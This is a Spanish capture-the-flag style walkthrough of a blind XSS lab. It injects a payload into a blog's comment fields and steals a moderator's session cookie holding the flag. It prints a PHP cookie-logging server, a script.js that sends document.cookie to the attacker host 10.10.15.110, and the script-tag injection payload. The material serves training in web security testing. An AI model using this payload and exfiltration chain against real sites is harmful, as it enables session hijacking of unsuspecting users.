---
description: 'Target(s): 10.129.2.56'
---

# Cross-Site Scripting (XSS)

Estamos realizando una tarea de pentesting de Aplicaciones Web para una compañía que te contrató, la cual acaba de lanzar su nuevo Blog de Seguridad. En nuestro plan de pentesting web, hemos llegado a la parte donde hay que probar las vulnerabilidades XSS contra la página web.

Inicia el servidor y accede al directorio **/assessment** usando el navegador.

Aplica los conocimientos adquiridos en el módulo para lograr los siguientes puntos:

1. Identificar el campo vulnerable a XSS.
2. Encontrar un payload XSS que ejecute javascript en el navegador de la víctima.
3. Utilizar técnicas de session hijacking para robar las cookies de la víctima, que deben contener la flag.

**Pregunta 1**: ¿Cuál es el valor de la cookie «flag»?

1. Accedemos a la URL 10.129.2.56/assessment desde el navegador.

<figure><img src="../../../../.gitbook/assets/image (439).png" alt=""><figcaption></figcaption></figure>

2. Por lo que leemos en el texto parece que la sección de comentarios va a ser nuestro vector de ataque. Encontramos un enlace que nos lleva al apartado de blog y aquí encontramos una sección de comentarios.

<figure><img src="../../../../.gitbook/assets/image (440).png" alt=""><figcaption></figcaption></figure>

3. Hacemos un comentario como prueba para ver como lo maneja la web.   &#x20;Cómo nos decía el texto de la página de inicio, un moderador (admin) tendrá que aceptar nuestro comentario, esto significa que tendremos que probar una Blind XSS.&#x20;
4. Prepararemos un servidor para ejecutar en nuestra máquina:

```
sudo mkdir /tmp/tmpserver
cd /tmp/tmpserver/
sudo nano index.php
```

5. Creamos el siguiente index.php en el directorio en el que levantaremos el server:

```
<?php
    if (isset($_GET['c'])) {
        $list = explode(";", $_GET['c']);
        foreach ($list as $key => $value) {
            $cookie = urldecode($value);
            $file = fopen("cookies.txt", "a+");
            fputs($file, "Victim IP: {$_SERVER['10.10.15.110']} | Cookie: {$cookie}\n");
            fclose($file);
        }
    }
?>
```

6. Crearemos un archivo script.js con el siguiente contenido:

```
new Image().src='http://10.10.15.110:8080/index.php?c='+document.cookie
```

7. Levantamos el servidor php en nuestra máquina:

```
sudo php -S 0.0.0.0:8080
```

8. Probaremos todos los campos (menos el de email) con el siguiente payload:

```
"><script src=http://10.10.15.110:8080/script.js>
```

9. Recibiremos la flag en el terminal con el servidor php levantado:

<figure><img src="../../../../.gitbook/assets/image (441).png" alt=""><figcaption></figcaption></figure>

10. También cómo en el index.php que habíamos creado, hemos indicado que se guarde en el archivo cookies.txt, podremos visualizarlo:

<figure><img src="../../../../.gitbook/assets/image (442).png" alt=""><figcaption></figcaption></figure>
